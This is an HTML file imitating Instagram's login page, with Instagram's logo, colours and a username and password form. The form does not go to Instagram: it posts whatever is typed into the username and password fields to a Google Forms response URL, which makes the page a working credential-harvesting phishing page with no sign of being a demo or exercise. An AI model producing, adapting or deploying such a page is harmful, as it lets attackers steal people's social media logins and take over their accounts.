<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 20px;
            margin-bottom: 10px;
            text-align: center;
            width: 350px;
        }
        .login-box img {
            width: 175px;
            margin-bottom: 20px;
        }
        .login-box form {
            display: flex;
            flex-direction: column;
        }
        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
        }
        .login-box button {
            padding: 10px;
            background-color: #3897f0;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 3px;
            margin-top: 10px;
            cursor: pointer;
            font-size: 14px;
        }
        .login-box a {
            color: #00376b;
            font-size: 14px;
            margin-top: 15px;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
            <form action="https://docs.google.com/forms/d/e/1FAIpQLSeZMVu044riZjfrpBU1OgqpmbqaroAXTLyZDqJq3TltSPyrtQ/formResponse" method="post">
                <input type="text" name="entry.138908147" placeholder="Phone number, username, or email" required>
                <input type="password" name="entry.751509507" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <a href="#">Forgot password?</a>
        </div>
    </div>
</body>
</html>
